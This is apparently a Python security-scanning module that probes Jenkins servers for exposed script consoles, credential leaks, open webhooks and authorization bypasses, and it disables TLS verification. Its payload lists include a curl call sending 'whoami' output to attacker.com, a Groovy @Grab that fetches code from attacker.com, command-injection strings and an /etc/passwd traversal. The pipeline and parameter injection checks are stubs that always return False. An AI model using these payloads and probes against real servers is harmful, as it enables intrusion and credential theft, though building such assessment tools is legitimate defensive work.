"""Jenkins Pipeline Misconfiguration Discovery Module

Automated fuzzing and vulnerability detection for Jenkins pipelines, jobs, and configurations.
"""

import json
import re
import time
from typing import Any, Optional

import requests


class JenkinsFuzzer:
    """Comprehensive Jenkins pipeline and configuration fuzzer."""

    def __init__(self, base_url: str, username: Optional[str] = None,
                 password: Optional[str] = None, proxy: Optional[str] = None,
                 session: Optional[requests.Session] = None):
        """Initialize Jenkins fuzzer.

        Args:
            base_url: Jenkins base URL
            username: Optional authentication username
            password: Optional authentication password
            proxy: Optional proxy URL
            session: Optional pre-configured requests session
        """
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.proxy = {"http": proxy, "https": proxy} if proxy else None

        if session:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.verify = False
            requests.packages.urllib3.disable_warnings()

            if username and password:
                self.session.auth = (username, password)

        self.findings: list[dict[str, Any]] = []
        self.jobs: list[str] = []
        self.pipelines: list[str] = []

    def fuzz_all(self) -> dict[str, list[dict[str, Any]]]:
        """Run all fuzzing modules.

        Returns:
            Dictionary of fuzzing results by category
        """
        results = {
            "pipeline_injection": self.fuzz_pipeline_injection(),
            "credential_exposure": self.fuzz_credential_exposure(),
            "script_console": self.fuzz_script_console_access(),
            "job_misconfig": self.fuzz_job_misconfigurations(),
            "parameter_injection": self.fuzz_parameter_injection(),
            "webhook_abuse": self.fuzz_webhook_vulnerabilities(),
            "plugin_misconfig": self.fuzz_plugin_misconfigurations(),
            "rbac_bypass": self.fuzz_rbac_bypasses(),
        }

        return results

    def fuzz_pipeline_injection(self) -> list[dict[str, Any]]:
        """Test for pipeline script injection vulnerabilities.

        Returns:
            List of findings
        """
        findings = []

        payloads = [
            "'; System.exit(0); //",
            "${System.getProperty('user.name')}",
            "@GrabResolver(name='malicious', root='http://attacker.com/')@Grab(group='com.evil', module='payload', version='1.0')",
            "node { sh 'curl http://attacker.com/$(whoami)' }",
            "pipeline { agent any; stages { stage('RCE') { steps { sh 'id' } } } }",
            "class Exploit { static { Runtime.getRuntime().exec('calc') } }",
        ]

        jobs = self._get_all_jobs()

        for job in jobs:
            for payload in payloads:
                result = self._test_pipeline_payload(job, payload)
                if result:
                    findings.append({
                        "type": "pipeline_injection",
                        "severity": "critical",
                        "job": job,
                        "payload": payload,
                        "description": "Pipeline accepts arbitrary Groovy code execution"
                    })

        return findings

    def fuzz_credential_exposure(self) -> list[dict[str, Any]]:
        """Detect exposed credentials in jobs and configurations.

        Returns:
            List of findings
        """
        findings = []

        patterns = {
            "aws_key": r"AKIA[0-9A-Z]{16}",
            "private_key": r"-----BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY-----",
            "password": r"(password|passwd|pwd)\s*[:=]\s*['\"]?([^'\"\\s]+)",
            "api_token": r"(api[_-]?key|token)\s*[:=]\s*['\"]?([a-zA-Z0-9_-]{20,})",
            "github_token": r"gh[ps]_[a-zA-Z0-9]{36}",
            "slack_token": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,}",
        }

        jobs = self._get_all_jobs()

        for job in jobs:
            config = self._get_job_config(job)
            if config:
                for pattern_name, pattern in patterns.items():
                    matches = re.findall(pattern, config, re.IGNORECASE)
                    if matches:
                        findings.append({
                            "type": "credential_exposure",
                            "severity": "high",
                            "job": job,
                            "credential_type": pattern_name,
                            "matches": len(matches),
                            "description": f"Potential {pattern_name} found in job configuration"
                        })

        return findings

    def fuzz_script_console_access(self) -> list[dict[str, Any]]:
        """Test for script console accessibility.

        Returns:
            List of findings
        """
        findings = []

        endpoints = [
            "/script",
            "/scriptText",
            "/manage/script",
            "/computer/(master)/script",
            "/computer/(built-in)/script",
        ]

        headers_bypass = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/script"},
            {"X-Rewrite-URL": "/script"},
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.base_url}{endpoint}",
                                       proxies=self.proxy, timeout=5)

                if resp.status_code in [200, 302]:
                    findings.append({
                        "type": "script_console_access",
                        "severity": "critical",
                        "endpoint": endpoint,
                        "status_code": resp.status_code,
                        "description": "Script console accessible"
                    })

                for headers in headers_bypass:
                    resp_bypass = self.session.get(
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        proxies=self.proxy,
                        timeout=5
                    )

                    if resp_bypass.status_code in [200, 302]:
                        findings.append({
                            "type": "script_console_bypass",
                            "severity": "critical",
                            "endpoint": endpoint,
                            "bypass_header": list(headers.keys())[0],
                            "description": "Script console accessible via header bypass"
                        })
            except Exception:
                pass

        return findings

    def fuzz_job_misconfigurations(self) -> list[dict[str, Any]]:
        """Detect job misconfigurations.

        Returns:
            List of findings
        """
        findings = []

        jobs = self._get_all_jobs()

        for job in jobs:
            config = self._get_job_config(job)
            if not config:
                continue

            if re.search(r'<command>.*sh.*</command>', config, re.IGNORECASE):
                if re.search(r'(curl|wget).*\|.*sh', config, re.IGNORECASE):
                    findings.append({
                        "type": "curl_to_shell",
                        "severity": "high",
                        "job": job,
                        "description": "Job executes piped shell commands (curl|sh pattern)"
                    })

            if re.search(r'allowRemoteTrigger.*true', config, re.IGNORECASE):
                findings.append({
                    "type": "remote_trigger_enabled",
                    "severity": "medium",
                    "job": job,
                    "description": "Job allows unauthenticated remote triggering"
                })

            if re.search(r'sandbox.*false', config, re.IGNORECASE):
                findings.append({
                    "type": "sandbox_disabled",
                    "severity": "critical",
                    "job": job,
                    "description": "Groovy sandbox disabled for job"
                })

            if re.search(r'sudo', config, re.IGNORECASE):
                findings.append({
                    "type": "sudo_execution",
                    "severity": "high",
                    "job": job,
                    "description": "Job configuration contains sudo commands"
                })

        return findings

    def fuzz_parameter_injection(self) -> list[dict[str, Any]]:
        """Test job parameter injection.

        Returns:
            List of findings
        """
        findings = []

        injection_payloads = [
            "; id",
            "$(whoami)",
            "`whoami`",
            "${Runtime.getRuntime().exec('id')}",
            "../../../etc/passwd",
        ]

        jobs = self._get_all_jobs()

        for job in jobs:
            if self._has_parameters(job):
                for payload in injection_payloads:
                    result = self._test_parameter_injection(job, payload)
                    if result:
                        findings.append({
                            "type": "parameter_injection",
                            "severity": "high",
                            "job": job,
                            "payload": payload,
                            "description": "Job parameter vulnerable to injection"
                        })

        return findings

    def fuzz_webhook_vulnerabilities(self) -> list[dict[str, Any]]:
        """Test webhook security.

        Returns:
            List of findings
        """
        findings = []

        webhook_endpoints = [
            "/buildByToken/build",
            "/generic-webhook-trigger/invoke",
            "/github-webhook/",
            "/git/notifyCommit",
            "/bitbucket-hook/",
        ]

        for endpoint in webhook_endpoints:
            try:
                resp = self.session.get(f"{self.base_url}{endpoint}",
                                       proxies=self.proxy, timeout=5)

                if resp.status_code in [200, 302, 400, 405]:
                    findings.append({
                        "type": "webhook_accessible",
                        "severity": "medium",
                        "endpoint": endpoint,
                        "status_code": resp.status_code,
                        "description": "Webhook endpoint accessible without authentication"
                    })
            except Exception:
                pass

        return findings

    def fuzz_plugin_misconfigurations(self) -> list[dict[str, Any]]:
        """Detect plugin-specific misconfigurations.

        Returns:
            List of findings
        """
        findings = []

        plugin_tests = {
            "git": ["/git/notifyCommit"],
            "script-security": ["/scriptApproval/"],
            "credentials": ["/credentials/"],
            "pipeline-groovy": ["/pipeline-syntax/"],
        }

        for plugin, endpoints in plugin_tests.items():
            for endpoint in endpoints:
                try:
                    resp = self.session.get(f"{self.base_url}{endpoint}",
                                           proxies=self.proxy, timeout=5)

                    if resp.status_code in [200, 302]:
                        findings.append({
                            "type": "plugin_misconfiguration",
                            "severity": "medium",
                            "plugin": plugin,
                            "endpoint": endpoint,
                            "description": f"{plugin} plugin endpoint accessible"
                        })
                except Exception:
                    pass

        return findings

    def fuzz_rbac_bypasses(self) -> list[dict[str, Any]]:
        """Test RBAC authorization bypasses.

        Returns:
            List of findings
        """
        findings = []

        bypass_techniques = [
            ("path_traversal", "/job/../manage/"),
            ("case_manipulation", "/Job/test/"),
            ("double_encoding", "/job/%252e%252e/manage/"),
            ("http_verb_tampering", "/manage/"),
        ]

        for technique, path in bypass_techniques:
            try:
                resp = self.session.get(f"{self.base_url}{path}",
                                       proxies=self.proxy, timeout=5)

                if resp.status_code in [200, 302]:
                    findings.append({
                        "type": "rbac_bypass",
                        "severity": "critical",
                        "technique": technique,
                        "path": path,
                        "status_code": resp.status_code,
                        "description": f"RBAC bypass possible via {technique}"
                    })
            except Exception:
                pass

        return findings

    def _get_all_jobs(self) -> list[str]:
        """Retrieve list of all jobs.

        Returns:
            List of job names
        """
        if self.jobs:
            return self.jobs

        try:
            resp = self.session.get(f"{self.base_url}/api/json",
                                   proxies=self.proxy, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                self.jobs = [job['name'] for job in data.get('jobs', [])]
                return self.jobs
        except Exception:
            pass
        return []

    def _get_job_config(self, job_name: str) -> Optional[str]:
        """Retrieve job configuration XML.

        Args:
            job_name: Job name

        Returns:
            Job configuration XML or None
        """
        try:
            resp = self.session.get(
                f"{self.base_url}/job/{job_name}/config.xml",
                proxies=self.proxy,
                timeout=10
            )
            if resp.status_code == 200:
                return resp.text
        except Exception:
            pass
        return None

    def _has_parameters(self, job_name: str) -> bool:
        """Check if job accepts parameters.

        Args:
            job_name: Job name

        Returns:
            True if job has parameters
        """
        config = self._get_job_config(job_name)
        if config:
            return 'ParametersDefinitionProperty' in config
        return False

    def _test_pipeline_payload(self, job_name: str, payload: str) -> bool:
        """Test if pipeline accepts payload.

        Args:
            job_name: Job name
            payload: Payload to test

        Returns:
            True if vulnerable
        """
        return False

    def _test_parameter_injection(self, job_name: str, payload: str) -> bool:
        """Test parameter injection.

        Args:
            job_name: Job name
            payload: Injection payload

        Returns:
            True if vulnerable
        """
        return False

    def export_results(self, findings: dict[str, list[dict[str, Any]]],
                      filename: str = "fuzzer_results.json") -> None:
        """Export fuzzing results to JSON.

        Args:
            findings: Fuzzing results
            filename: Output filename
        """
        total_findings = sum(len(f) for f in findings.values())

        output = {
            "target_url": self.base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_findings": total_findings,
            "findings": findings
        }

        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)


def fuzz_jenkins(base_url: str, username: Optional[str] = None,
                password: Optional[str] = None, proxy: Optional[str] = None) -> dict[str, list[dict[str, Any]]]:
    """Convenience function to fuzz Jenkins instance.

    Args:
        base_url: Jenkins URL
        username: Optional username
        password: Optional password
        proxy: Optional proxy URL

    Returns:
        Dictionary of fuzzing results
    """
    fuzzer = JenkinsFuzzer(base_url, username, password, proxy)
    return fuzzer.fuzz_all()
